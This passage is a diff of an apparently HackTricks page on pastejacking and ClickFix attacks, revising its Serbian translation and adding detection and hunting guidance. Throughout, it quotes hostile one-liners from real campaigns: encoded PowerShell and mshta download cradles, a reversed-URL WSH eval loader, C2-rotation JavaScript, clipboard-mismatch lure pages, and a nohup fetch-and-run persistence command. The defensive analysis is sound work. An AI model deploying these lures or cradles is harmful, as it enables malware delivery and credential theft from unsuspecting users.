@@ -1,30 +1,30 @@
-# Clipboard Hijacking (Pastejacking) Attacks
+# Clipboard Hijacking (Pastejacking) napadi
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> "Never paste anything you did not copy yourself." – stari ali i dalje važeći savet
+> „Nikada ne nalepite ništa što sami niste kopirali.“ – stari, ali i dalje važeći savet
 
-## Overview
+## Pregled
 
-Clipboard hijacking – takođe poznat kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju-i-lepe komande bez provere. Zlonamerna web stranica (ili bilo koji kontekst sa JavaScript mogućnostima, kao što je Electron ili Desktop aplikacija) programski ubacuje tekst pod kontrolom napadača u sistemski clipboard. Žrtve se podstiču, obično pažljivo osmišljenim social-engineering uputstvima, da pritisnu **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ili otvore terminal i *nalepi* sadržaj clipboard-a, odmah izvršavajući proizvoljne komande.
+Clipboard hijacking – poznat i kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju i nalepljuju komande bez njihove provere. Zlonamerna veb stranica (ili bilo koji kontekst sa podrškom za JavaScript, kao što su Electron ili Desktop aplikacije) programski postavlja tekst pod kontrolom napadača u sistemski clipboard. Žrtve se podstiču, obično pažljivo osmišljenim uputstvima za social engineering, da pritisnu **Win + R** (dijalog Run), **Win + X** (Quick Access / PowerShell), ili otvore terminal i *nalepе* sadržaj iz clipboard-a, čime se odmah izvršavaju proizvoljne komande.
 
-Pošto se **ne preuzima nijedan fajl i ne otvara nijedan attachment**, tehnika zaobilazi većinu e-mail i web-content security kontrola koje prate attachments, macros ili direktno izvršavanje komandi. Napad je zato popularan u phishing kampanjama koje isporučuju commodity malware familije kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.
+Pošto se **nijedan fajl ne preuzima i nijedan attachment se ne otvara**, ova tehnika zaobilazi većinu bezbednosnih kontrola za e-mail i veb sadržaj koje nadziru attachment-e, makroe ili direktno izvršavanje komandi. Zbog toga je ovaj napad popularan u phishing kampanjama koje isporučuju commodity malware familije kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.<sup>[[1]](#references)</sup>
 
-## Wallet-address replacement clippers
+## Clipper-i za zamenu adresa wallet-a
 
-Druga varijanta **clipboard hijacking** ne lepi komande uopšte: čeka dok žrtva ne kopira **cryptocurrency wallet address**, zatim je tiho zamenjuje adresom pod kontrolom napadača neposredno pre lepljenja. Ovo je posebno efikasno protiv dugih wallet formata jer korisnici često proveravaju samo prve/poslednje karaktere.
+Druga varijanta **clipboard hijacking-a** uopšte ne nalepljuje komande: čeka da žrtva kopira **adresu cryptocurrency wallet-a**, a zatim je neprimetno zamenjuje adresom pod kontrolom napadača neposredno pre lepljenja. Ovo je naročito efikasno kod dugačkih wallet formata, jer korisnici često proveravaju samo početne i završne znakove.<sup>[[8]](#references)</sup>
 
-Uobičajene osobine iz prakse:
-- **Thin loader + nested payload**: vidljiva app/exe izgleda kao legitiman trading ili "profit" alat, dok je pravi clipper sakriven dublje u bundle-u (na primer .NET loader koji pokreće ugnježdeni Rust payload).
-- **Regex-driven replacement**: malware prepoznaje stringove kao što su `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ili čak generičke **44-character Solana-like** stringove i prepisuje ih u attacker wallet-e.
-- **Wallet rotation at scale**: moderni Windows primerci mogu da ugrađuju **hiljade** replacement wallet-a po valuti umesto jedne statične adrese, smanjujući trošenje reputacije wallet-a nakon svake krađe.
+Uobičajene karakteristike iz stvarnog sveta:
+- **Thin loader + nested payload**: vidljiva aplikacija/exe izgleda kao legitimni trading ili alat za ostvarivanje „profita“, dok je pravi clipper sakriven dublje u bundle-u (na primer .NET loader pokreće nested Rust payload).
+- **Regex-driven replacement**: malware pronalazi stringove kao što su `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, ili čak generičke **44-karakterne stringove nalik Solana adresama**, i zamenjuje ih wallet adresama napadača.
+- **Wallet rotation at scale**: moderni Windows uzorci mogu sadržati **hiljade** zamenskih wallet adresa po valuti umesto jedne statične adrese, čime se smanjuje narušavanje reputacije wallet-a nakon svake krađe.<sup>[[8]](#references)</sup>
 
-### Windows clipper flow
+### Windows clipper tok
 
-Uobičajena implementacija je skriveni prozor registrovan sa **`AddClipboardFormatListener`**. Pri svakoj clipboard nadogradnji, malware tipično poziva:
-- **`OpenClipboard`** → pristup trenutnim clipboard podacima.
+Uobičajena implementacija je skriveni prozor registrovan pomoću **`AddClipboardFormatListener`**. Pri svakom ažuriranju clipboard-a, malware obično poziva:<sup>[[8]](#references)</sup>
+- **`OpenClipboard`** → pristupa trenutnim podacima u clipboard-u.
 - **`GetClipboardData`** → čita tekst.
-- **`EmptyClipboard`** + **`SetClipboardData`** → zamenjuje wallet string attacker vrednošću.
+- **`EmptyClipboard`** + **`SetClipboardData`** → zamenjuje wallet string vrednošću napadača.
 
 Minimalni hunting regex-i koji se često viđaju u clipper-ima:
 ```regex
@@ -35,40 +35,40 @@ Minimalni hunting regex-i koji se često viđaju u clipper-ima:
 \b(addr1)[A-Za-z0-9]{26,108}\b
 \b[A-Za-z0-9]{44}\b
 ```
-Кориснички ниво persistence je dovoljan za impact. Jedan uočeni obrazac je:
-- Kopirati payload u **`%APPDATA%\silke\silke.exe`**
-- Kreirati **Startup-folder LNK** pod `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`
+Perzistencija na nivou korisnika dovoljna je za ostvarivanje uticaja. Jedan uočeni obrazac je:<sup>[[8]](#references)</sup>
+- Kopiranje payload-a u **`%APPDATA%\silke\silke.exe`**
+- Kreiranje **Startup-folder LNK** datoteke u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`
 
-Ideje za detection:
-- Procesi koji kontinuirano pozivaju clipboard APIs dok istovremeno upisuju u `%APPDATA%` i korisnički **Startup** folder.
-- Novo LNK/executable kreiranje praćeno wallet-address clipboard rewrites.
-- Archive ili fake-software bundle-ovi koji sadrže mnogo neiskorišćenih fajlova plus mali launcher koji pokreće nested binary.
+Ideje za detekciju:
+- Procesi koji neprekidno pozivaju clipboard API-je, a istovremeno upisuju podatke u `%APPDATA%` i korisnički **Startup** folder.
+- Kreiranje novih LNK/izvršnih datoteka, nakon čega slede izmene clipboard-a sa adresama wallet-a.
+- Arhive ili paketi lažnog software-a koji sadrže mnogo neiskorišćenih datoteka i mali launcher koji pokreće ugnježdeni binary.
 
-### macOS social-engineered quarantine removal + LaunchAgent persistence
+### macOS socijalno inženjerisano uklanjanje quarantine-a + LaunchAgent persistence
 
-Na macOS-u, neke kampanje isporučuju **`unlocker.command`** helper i instruiraju žrtvu da desni klik → **Open** ako Gatekeeper kaže da je app oštećen ili od neidentifikovanog developera. Script jednostavno uklanja quarantine i pokreće obližnji `.app`:
+Na macOS-u, neke kampanje isporučuju pomoćnu skriptu **`unlocker.command`** i upućuju žrtvu da klikne desnim tasterom miša → **Open** ako Gatekeeper prijavi da je aplikacija oštećena ili potiče od neidentifikovanog developera. Skripta jednostavno uklanja quarantine i pokreće obližnji `.app`:<sup>[[8]](#references)</sup>
 ```bash
 /usr/bin/xattr -cr "$chosen"
 /usr/bin/open "$chosen"
 ```
-This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.
+Ovo **nije** Gatekeeper exploit; to je **social-engineered quarantine bypass** koji zloupotrebljava činjenicu da Gatekeeper odluke zavise od `com.apple.quarantine` xattr.<sup>[[8]](#references)</sup>
 
-After execution, the clipper can persist as the current user by writing:
-- **`~/launch.sh`** – wrapper script
-- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`
+Nakon izvršavanja, clipper može da se zadrži kao trenutni korisnik upisivanjem:<sup>[[8]](#references)</sup>
+- **`~/launch.sh`** – wrapper skripta
+- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent sa `RunAtLoad` i `KeepAlive`
 
-A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
-1. Kill the active clipper process.
-2. Unload/delete the LaunchAgent plist.
-3. Delete `~/launch.sh` and the copied payload.
+Koristan detalj za odbranu jeste to što neki uzorci implementiraju **self-healing watchdog** koji ponovo upisuje LaunchAgent i wrapper na svakih približno 30 sekundi. Ako prvo uklonite plist **bez zaustavljanja pokrenutog procesa**, malware ga može odmah ponovo kreirati.<sup>[[8]](#references)</sup> Bezbedan redosled čišćenja:
+1. Zaustavite aktivni clipper proces.
+2. Unload-ujte/obrišite LaunchAgent plist.
+3. Obrišite `~/launch.sh` i kopirani payload.
 
-### Delivery note: fake reputation as a force multiplier
+### Napomena o distribuciji: lažna reputacija kao force multiplier
 
-For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.
+Kod ove familije, sam malware može ostati tehnički jednostavan, dok **distribution layer** obavlja glavninu posla: lažni GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views i bezazleno izgledajući VirusTotal comments/votes koriste se kako bi binary delovao pouzdano pre izvršavanja.<sup>[[8]](#references)</sup>
 
-## Forced copy buttons and hidden payloads (macOS one-liners)
+## Dugmad za obavezno kopiranje i skriveni payload-i (macOS one-liners)
 
-Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.
+Neki macOS infostealers kloniraju installer sajtove (npr. Homebrew) i **nameću korišćenje dugmeta „Copy“** kako korisnici ne bi mogli da označe samo vidljivi tekst. Unos u clipboard sadrži očekivanu installer komandu kojoj je dodat Base64 payload (npr. `...; echo <b64> | base64 -d | sh`), tako da jedno paste izvršavanje pokreće oba dela, dok UI skriva dodatnu fazu.<sup>[[5]](#references)</sup>
 
 ## JavaScript Proof-of-Concept
 ```html
@@ -82,17 +82,17 @@ navigator.clipboard.writeText(payload)
 }
 </script>
 ```
-Starije kampanje su koristile `document.execCommand('copy')`, a novije se oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).
+Starije kampanje koristile su `document.execCommand('copy')`, dok se novije oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>
 
-## The ClickFix / ClearFake Flow
+## ClickFix / ClearFake tok
 
-1. Korisnik poseti typosquatted ili kompromitovan sajt (npr. `docusign.sa[.]com`)
-2. Ubaceni **ClearFake** JavaScript poziva `unsecuredCopyToClipboard()` helper koji tiho smešta Base64-enkodovan PowerShell one-liner u clipboard.
-3. HTML uputstva govore žrtvi da: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
-4. `powershell.exe` se izvršava i preuzima arhivu koja sadrži legitiman executable plus malicious DLL (klasično DLL sideloading).
-5. Loader dekriptira dodatne faze, ubacuje shellcode i instalira persistence (npr. scheduled task) – na kraju pokrećući NetSupport RAT / Latrodectus / Lumma Stealer.
+1. Korisnik posećuje typosquatted ili kompromitovani sajt (npr. `docusign.sa[.]com`)
+2. Ubačeni **ClearFake** JavaScript poziva pomoćnu funkciju `unsecuredCopyToClipboard()`, koja neprimetno čuva Base64-kodirani PowerShell one-liner u clipboardu.
+3. HTML uputstva govore žrtvi: *„Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da biste rešili problem.“*
+4. `powershell.exe` se izvršava i preuzima arhivu koja sadrži legitiman izvršni fajl i maliciozni DLL (klasični DLL sideloading).
+5. Loader dešifruje dodatne stage-ove, ubacuje shellcode i instalira persistence (npr. scheduled task) – što na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>
 
-### Example NetSupport RAT Chain
+### Primer lanca NetSupport RAT-a
 ```powershell
 powershell -nop -w hidden -enc <Base64>
 # ↓ Decodes to:
@@ -100,35 +100,35 @@ Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
 Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
 %TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
 ```
-* `jp2launcher.exe` (legitimni Java WebStart) pretražuje svoj direktorijum za `msvcp140.dll`.
-* Zlonamerni DLL dinamički rešava API-je pomoću **GetProcAddress**, preuzima dve binarne datoteke (`data_3.bin`, `data_4.bin`) putem **curl.exe**, dešifruje ih koristeći rolling XOR ključ `"https://google.com/"`, ubacuje finalni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.
+* `jp2launcher.exe` (legitimni Java WebStart) u svom direktorijumu traži `msvcp140.dll`.
+* Zlonamerni DLL dinamički razrešava API-je pomoću **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) putem **curl.exe**, dešifruje ih koristeći rolling XOR ključ `"https://google.com/"`, ubacuje finalni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>
 
 ### Latrodectus Loader
 ```
 powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
-1. Preuzima `la.txt` sa **curl.exe**
+1. Preuzima `la.txt` pomoću **curl.exe**
 2. Izvršava JScript downloader unutar **cscript.exe**
-3. Preuzima MSI payload → ostavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.
+3. Dohvata MSI payload → postavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>
 
-### Lumma Stealer via MSHTA
+### Lumma Stealer preko MSHTA
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-The **mshta** poziv pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, ekstraktuje `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` preko `extrac32` i spajanja fajlova i na kraju pokreće `.a3x` skript koji eksfiltrira browser credentials ka `sumeriavgv.digital`.
+Poziv **mshta** pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, izdvaja `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` pomoću `extrac32` i konkatenacije datoteka, a zatim pokreće `.a3x` skript koji eksfiltrira akreditive pregledača na `sumeriavgv.digital`.<sup>[[1]](#references)</sup>
 
-## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)
+## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK sa rotirajućim C2 (PureHVNC)
 
-Neke ClickFix kampanje potpuno preskaču preuzimanje fajlova i nalažu žrtvama da nalepе jedan red koji preko WSH-a preuzima i izvršava JavaScript, uspostavlja perzistenciju i svakog dana rotira C2. Primer posmatranog lanca:
+Neke ClickFix kampanje u potpunosti preskaču preuzimanje datoteka i umesto toga navode žrtve da nalepе one-liner koji preuzima i izvršava JavaScript putem WSH-a, obezbeđuje njegovo trajanje i svakodnevno rotira C2. Primer uočеног lanca:<sup>[[3]](#references)</sup>
 ```powershell
 powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
 ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
 ```
-Ključne osobine
-- Obfuskovani URL se obrće tokom izvršavanja kako bi se sprečila površna inspekcija.
-- JavaScript se održava preko Startup LNK (WScript/CScript) i bira C2 prema trenutnom danu – omogućavajući brzu rotaciju domena.
+Ključne karakteristike
+- Ofuskovani URL se obrće tokom izvršavanja kako bi se onemogućila površna inspekcija.
+- JavaScript se perzistira putem Startup LNK-a (WScript/CScript) i bira C2 na osnovu trenutnog dana – što omogućava brzu rotaciju domena.<sup>[[3]](#references)</sup>
 
-Minimalni JS fragment korišćen za rotaciju C2 po datumu:
+Minimalni JS fragment koji se koristi za rotaciju C2 servera prema datumu:<sup>[[3]](#references)</sup>
 ```js
 function getURL() {
 var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
@@ -140,36 +140,35 @@ return 'https://'
 + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
 }
 ```
-Sledeći stadijum obično deploy-uje loader koji uspostavlja persistence i povlači RAT (npr. PureHVNC), često pinning TLS na hardcoded certificate i chunking traffic.
+Sledeća faza obično postavlja loader koji uspostavlja persistence i preuzima RAT (npr. PureHVNC), često vezujući TLS za hardkodovani sertifikat i deleći saobraćaj na delove.<sup>[[3]](#references)</sup>
 
-Detection ideje specifične za ovu varijantu
-- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
-- Startup artifacts: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji poziva WScript/CScript sa JS path-om ispod `%TEMP%`/`%APPDATA%`.
-- Registry/RunMRU i command-line telemetry koji sadrže `.split('').reverse().join('')` ili `eval(a.responseText)`.
-- Ponovljeni `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin payload-ovima za ubacivanje dugih skripti bez dugih command line-ova.
-- Scheduled Tasks koji naknadno izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` pod task/path-om koji izgleda kao updater (npr. `\GoogleSystem\GoogleUpdater`).
+Ideje za detekciju specifične za ovu varijantu
+- Stablo procesa: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
+- Startup artefakti: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji poziva WScript/CScript sa JS putanjom ispod `%TEMP%`/`%APPDATA%`.
+- Registry/RunMRU i telemetrija komandne linije koja sadrži `.split('').reverse().join('')` ili `eval(a.responseText)`.
+- Ponavljani `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin payload-ima za prosleđivanje dugih skripti bez dugih komandnih linija.
+- Scheduled Tasks koji naknadno izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` u okviru task-a/putanje koja izgleda kao updater (npr. `\GoogleSystem\GoogleUpdater`).
 
 Threat hunting
-- Daily-rotating C2 hostnames i URL-ovi sa `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern-om.
-- Korelacija clipboard write events nakon kojih sledi Win+R paste pa odmah `powershell.exe` execution.
+- C2 hostnames i URLs koji se rotiraju svakog dana, sa obrascem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
+- Korelisati događaje upisa u clipboard, nakon kojih sledi lepljenje pomoću Win+R, a zatim neposredno izvršavanje `powershell.exe`.
 
+Blue-teams mogu kombinovati clipboard, kreiranje procesa i Registry telemetriju kako bi precizno locirali zloupotrebu pastejacking-a:
 
-Blue-teams mogu da kombinuju clipboard, process-creation i registry telemetry da pinpoint-uju pastejacking abuse:
-
-* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – tražite neuobičajene Base64 / obfuscated unose.
-* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe` i `NewProcessName` u { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
-* Event ID **4663** za kreiranje fajlova ispod `%LocalAppData%\Microsoft\Windows\WinX\` ili privremenih foldera neposredno pre sumnjivog 4688 eventa.
-* EDR clipboard senzori (ako postoje) – korrelišite `Clipboard Write` odmah praćen novim PowerShell procesom.
+* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – potražite neuobičajene Base64 / obfuscated unose.
+* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe`, a `NewProcessName` u skupu { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
+* Event ID **4663** za kreiranje fajlova ispod `%LocalAppData%\Microsoft\Windows\WinX\` ili u privremenim folderima neposredno pre sumnjivog 4688 događaja.
+* EDR clipboard senzori (ako postoje) – korelisati `Clipboard Write` sa neposrednim pokretanjem novog PowerShell procesa.
 
 ## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads
 
-Nedavne kampanje masovno prave lažne CDN/browser verification strane ("Just a moment…", IUAM-style) koje navode korisnike da kopiraju OS-specifične komande iz clipboarda u native konzole. Ovo prebacuje execution van browser sandbox-a i radi na Windows i macOS.
+Nedavne kampanje masovno proizvode lažne CDN/browser verification pages ("Just a moment…", IUAM-style) koje primoravaju korisnike da kopiraju OS-specific komande iz clipboard-a u native console. Time se izvršavanje premešta iz browser sandbox-a i funkcioniše na Windows-u i macOS-u.<sup>[[4]](#references)</sup>
 
-Ključne osobine builder-generated strana
-- OS detection preko `navigator.userAgent` radi prilagođavanja payload-ova (Windows PowerShell/CMD vs. macOS Terminal). Opcioni decoy/no-op za unsupported OS da se održi iluzija.
-- Automatsko clipboard-copy pri benignim UI akcijama (checkbox/Copy), dok vidljivi tekst može da se razlikuje od clipboard sadržaja.
-- Mobile blocking i popover sa uputstvima korak po korak: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
-- Opcioni obfuscation i single-file injector za overwriting kompromitovanog site-a sa DOM-om i Tailwind-styled verification UI (nije potrebna nova domain registration).
+Ključne karakteristike stranica generisanih pomoću builder-a
+- Detekcija OS-a pomoću `navigator.userAgent` radi prilagođavanja payload-a (Windows PowerShell/CMD naspram macOS Terminal-a). Opcioni decoys/no-ops za nepodržane OS-ove održavaju privid.
+- Automatsko kopiranje u clipboard pri bezopasnim UI akcijama (checkbox/Copy), dok se vidljivi tekst može razlikovati od sadržaja clipboard-a.
+- Blokiranje mobilnih uređaja i popover sa detaljnim uputstvima: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
+- Opcioni obfuscation i single-file injector za prepisivanje DOM-a kompromitovanog sajta pomoću verification UI-ja stilizovanog u Tailwind-u (nije potrebna registracija novog domena).<sup>[[4]](#references)</sup>
 
 Primer: clipboard mismatch + OS-aware branching
 ```html
@@ -198,10 +197,10 @@ document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal 
 document.getElementById('chk').addEventListener('click', copyReal);
 </script>
 ```
-macOS perzistencija početnog pokretanja
-- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` tako da se izvršavanje nastavi nakon zatvaranja terminala, smanjujući vidljive tragove.
+macOS persistence početnog pokretanja
+- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kako bi se izvršavanje nastavilo nakon zatvaranja terminala, uz smanjenje vidljivih tragova.<sup>[[4]](#references)</sup>
 
-Preuzimanje stranice na kompromitovanim sajtovima u mestu
+Preuzimanje stranice na kompromitovanim sajtovima
 ```html
 <script>
 (async () => {
@@ -213,13 +212,13 @@ document.head.appendChild(s);
 })();
 </script>
 ```
-- Ideje za detekciju i hunting specifične za IUAM-style lures
-- Web: Stranice koje vezuju Clipboard API za verification widgete; neslaganje između prikazanog teksta i clipboard payload-a; `navigator.userAgent` grananje; Tailwind + single-page replace u sumnjivim kontekstima.
-- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon browser interakcije; batch/MSI instaleri izvršeni iz `%TEMP%`.
-- macOS endpoint: Terminal/iTerm koji pokreće `bash`/`curl`/`base64 -d` sa `nohup` blizu browser događaja; background jobs koji preživljavaju zatvaranje terminala.
-- Korelirajte `RunMRU` Win+R istoriju i clipboard writes sa kasnijim kreiranjem console procesa.
+Detekcija i hunting ideje specifične za IUAM-style mamce
+- Web: Stranice koje povezuju Clipboard API sa verification widgetima; nepodudaranje između prikazanog teksta i clipboard payload-a; grananje pomoću `navigator.userAgent`; Tailwind + zamena single-page sadržaja u sumnjivim kontekstima.
+- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon interakcije sa browserom; batch/MSI installer-i pokrenuti iz `%TEMP%`.
+- macOS endpoint: Terminal/iTerm koji pokreće `bash`/`curl`/`base64 -d` sa `nohup` u blizini browser događaja; background jobs koji opstaju nakon zatvaranja terminala.
+- Korelisati `RunMRU` Win+R istoriju i clipboard writes sa naknadnim kreiranjem console procesa.
 
-Pogledajte i za prateće tehnike
+Pogledajte takođe prateće tehnike
 
 {{#ref}}
 clone-a-website.md
@@ -229,62 +228,62 @@ clone-a-website.md
 homograph-attacks.md
 {{#endref}}
 
-## 2026 fake CAPTCHA / ClickFix evolucije (ClearFake, Scarlet Goldfinch)
+## Evolucije lažnog CAPTCHA / ClickFix pristupa iz 2026. (ClearFake, Scarlet Goldfinch)
 
-- ClearFake i dalje kompromituje WordPress sajtove i ubacuje loader JavaScript koji lančano koristi eksternе hostove (Cloudflare Workers, GitHub/jsDelivr) i čak blockchain “etherhiding” pozive (npr. POST-ove ka Binance Smart Chain API endpointima kao što je `bsc-testnet.drpc[.]org`) da bi preuzeo trenutnu lure logiku. Nedavni overlay-ji intenzivno koriste fake CAPTCHAs koji upućuju korisnike da copy/paste-uju jedan liner (T1204.004) umesto da bilo šta preuzimaju.
-- Početno izvršavanje se sve više delegira potpisanim script hostovima/LOLBAS. Lanac iz januara 2026. zamenio je raniju `mshta` upotrebu ugrađenim `SyncAppvPublishingServer.vbs` izvršenim preko `WScript.exe`, prosleđujući PowerShell-like argumente sa aliasima/wildcardima za fetch udaljenog sadržaja:
+- ClearFake i dalje kompromituje WordPress sajtove i ubacuje loader JavaScript koji povezuje spoljne hostove (Cloudflare Workers, GitHub/jsDelivr), pa čak i blockchain “etherhiding” pozive (npr. POST zahteve ka Binance Smart Chain API endpointima kao što je `bsc-testnet.drpc[.]org`) radi preuzimanja aktuelne logike mamca. Noviji overlay-i intenzivno koriste lažne CAPTCHA provere koje upućuju korisnike da kopiraju/ubace jednu liniju koda (T1204.004), umesto da bilo šta preuzimaju.<sup>[[6]](#references)</sup>
+- Početno izvršavanje se sve češće delegira potpisanim script hostovima/LOLBAS alatima. Lanci iz januara 2026. zamenili su raniju upotrebu `mshta` ugrađenim `SyncAppvPublishingServer.vbs`, koji se izvršava putem `WScript.exe` i prosleđuje PowerShell-like argumente sa aliasima/wildcards radi preuzimanja udaljenog sadržaja:<sup>[[6]](#references)</sup>
 ```cmd
 "C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
 ```
-- `SyncAppvPublishingServer.vbs` je potpisan i normalno ga koristi App-V; uparен sa `WScript.exe` i neuobičajenim argumentima (`gal`/`gcm` aliasi, wildcarded cmdlets, jsDelivr URLs) postaje high-signal LOLBAS stage za ClearFake.
-- February 2026 fake CAPTCHA payloads su se vratili na čiste PowerShell download cradles. Dva live primera:
+- `SyncAppvPublishingServer.vbs` je potpisan i obično se koristi za App-V; u kombinaciji sa `WScript.exe` i neuobičajenim argumentima (`gal`/`gcm` aliases, cmdlet-ima sa wildcard znakovima, jsDelivr URL-ovima) postaje LOLBAS stage visokog signala za ClearFake.<sup>[[6]](#references)</sup>
+- Lažni CAPTCHA payloadi iz februara 2026. ponovo su prešli na čiste PowerShell download cradle-ove. Dva aktivna primera:<sup>[[6]](#references)</sup>
 ```powershell
 "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
 "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
 ```
-- Prvi lanac je in-memory `iex(irm ...)` grabber; drugi se staguje preko `WinHttp.WinHttpRequest.5.1`, upisuje privremeni `.ps1`, zatim pokreće sa `-ep bypass` u skrivenom prozoru.
+- Prvi lanac je in-memory `iex(irm ...)` grabber; drugi koristi `WinHttp.WinHttpRequest.5.1`, upisuje privremeni `.ps1`, a zatim ga pokreće sa `-ep bypass` u skrivenom prozoru.<sup>[[6]](#references)</sup>
 
-Detection/hunting tips for these variants
-- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles odmah nakon clipboard writes/Win+R.
-- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domeni, ili raw IP `iex(irm ...)` obrasci.
-- Network: outbound ka CDN worker hostovima ili blockchain RPC endpointima iz script hosts/PowerShell-a ubrzo nakon web browsing.
-- File/registry: privremeno kreiranje `.ps1` pod `%TEMP%` plus RunMRU entries koji sadrže ove one-linere; block/alert na signed-script LOLBAS (WScript/cscript/mshta) koji izvršava sa eksternim URL-ovima ili obfuskiranim alias stringovima.
+Saveti za detekciju/hunting ovih varijanti
+- Linija procesa: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles neposredno nakon upisa u clipboard/Win+R.
